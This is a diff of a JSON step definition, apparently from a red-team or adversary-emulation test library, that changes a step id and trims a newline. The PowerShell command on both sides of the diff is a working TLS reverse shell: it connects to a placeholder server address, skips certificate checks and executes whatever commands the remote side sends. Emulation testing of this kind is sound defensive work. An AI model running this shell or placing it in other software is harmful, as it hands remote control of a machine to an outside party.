@@ -7,10 +7,10 @@
   ],
   "steps": [
     {
-      "id": "1c277863-819c-4d8e-aa9e-83a3a88bfff9",
+      "id": "3e974380-70c4-4d12-aa27-1fa3adbf15a3",
       "type": "execute-command",
       "data": {
-        "command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '\u003e ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2\u003e\u00261;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n",
+        "command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '\u003e ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2\u003e\u00261;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}",
         "command_type": "powershell"
       },
       "elevation_required": false
